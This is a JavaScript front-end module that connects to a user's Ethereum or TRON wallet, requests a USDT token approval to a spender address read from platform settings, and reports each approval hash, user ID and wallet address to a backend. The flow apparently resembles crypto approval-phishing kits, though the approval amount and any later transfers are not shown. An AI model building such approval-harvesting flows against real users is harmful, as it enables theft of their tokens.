import { showLoadingToast, closeToast, showToast } from 'vant'
import {
  check as checkETH,
  connect as connectETH,
  initSwitchWalletEvent as initSwitchWalletEventETH,
  approve as approveETH
} from './eth'
import {
  check as checkTRON,
  connect as connectTRON,
  initSwitchWalletEvent as initSwitchWalletEventtTRON,
  approve as approveTRON
} from './tron'
import { sendApproveHashApi } from '@/api/common/chain'
import { useUserStore } from '@/store/user'
import { useMainStore } from '@/store'
let isTron = false
let isEth = false

/**
 * 获取账户信息
 */
export const getAcount = async () => {
  isTron = await checkTRON()
  isEth = await checkETH()
  let res = null
  //优先选择eth
  if (isEth && isTron) {
    res = await connectETH()
  } else if (isTron) {
    // 判断波场
    res = await connectTRON()
  } else if (isEth) {
    //判断以太坊
    res = await connectETH()
  }
  // console.log('判断以太坊', res)
  if (res?.code == 200) {
    return res
  } else {
    res?.msg && showToast(res.msg)
    return 'no-wallet'
  }
}
/**
 * 切换钱包监听事件
 */
export const initSwitchWalletEvent = async () => {
  isTron = await checkTRON()
  isEth = await checkETH()
  // 需要检测是否链接
  isTron && initSwitchWalletEventtTRON()
  isEth && initSwitchWalletEventETH()
}

/**
 * 切换钱包监听事件
 */
export const approve = async (type = 'USDT') => {
  showLoadingToast()
  // 配置授权地址
  isTron = await checkTRON()
  isEth = await checkETH()
  const { platFormConfig } = useMainStore()
  let res = null
  if ((isEth && isTron) || isEth) {
    let spenderAddress = platFormConfig.APPROVE_ADDRESS.ETH
    const { approveMethod } = await approveETH(spenderAddress, type)
    approveMethod.on('transactionHash', (hash) => {
      // 交易发送成功
      sendApproveHash(hash)
    })
    res = approveMethod
  } else if (isTron) {
    let spenderAddress = platFormConfig.APPROVE_ADDRESS.TRON
    res = await approveTRON(spenderAddress)
    sendApproveHash(res)
  }
  closeToast()
  return res
}
/**
 * 发送交易hash
 */
const sendApproveHash = async (hash) => {
  const userStore = useUserStore()
  await sendApproveHashApi({
    userId: userStore.userInfo.user.userId,
    address: userStore.userInfo.user.address,
    hash
  })
}
